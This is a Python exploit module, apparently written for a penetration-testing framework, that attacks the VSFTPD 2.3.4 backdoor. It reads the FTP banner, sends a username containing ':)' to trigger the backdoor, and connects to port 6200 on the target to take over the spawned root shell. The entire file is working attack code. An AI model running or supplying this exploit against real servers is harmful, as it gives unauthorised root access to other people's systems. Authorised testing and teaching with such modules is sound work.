import socket as s
import string, random

import core.exploit.kexploit
import core.errors
from core.exploit.kexploitparams import KExploitParams
from core.handlers.plainshellhandler import PlainShellHandler
from shell.util import print_err


class VsftpdBackdoor(core.exploit.kexploit.KExploit):
    def init(self):
        self.info['description'] = 'VSFTPD v2.3.4 has intentional backdoor vulnerability ' \
                                   'which spawns TCP root shell backdoor when username contains smiley \":)\"'

        self.params.add_param('TARGETIP', True, 'Remote vulnerable vsftpd server IP', '192.168.0.2', KExploitParams.validator_ipv4)\
            .add_param('TARGETPORT', True, 'Remote vsftpd port', 21, KExploitParams.validator_port)\


    def handle_shell(self):
        shellsock = s.socket(s.AF_INET, s.SOCK_STREAM)
        shell_handler = PlainShellHandler(shellsock)

        print('Attempting to connect to spawned shell')
        try:
            shellsock.connect((self.params.get_param_value('TARGETIP'), 6200))
        except s.error as err:
            raise core.errors.ExploitFailed('Connection error: ' + str(err))

        shell_handler.handle_shell()




    def run(self):
        ftp_conn = s.socket(s.AF_INET, s.SOCK_STREAM)

        print('Connecting')
        try:
            ftp_conn.connect((self.params.get_param_value('TARGETIP'), self.params.get_param_value('TARGETPORT')))
        except s.error as err:
            raise core.errors.ExploitFailed('Connection error: ' + str(err))

        print('Connected')

        banner = ftp_conn.recv(1024).decode('ascii')

        if 'vsftpd 2.3.4' in banner.lower():
            print('Server is vulnerable to backdoor')
            ftp_conn.send(b'USER admin:)\n')
            ftp_conn.recv(2048)
            ftp_conn.send(b'PASS admin\n')
            ftp_conn.close()
            print('Exploit completed')
            self.handle_shell()
        else:
            raise core.errors.ExploitFailed('Server is not vulnerable to backdoor')




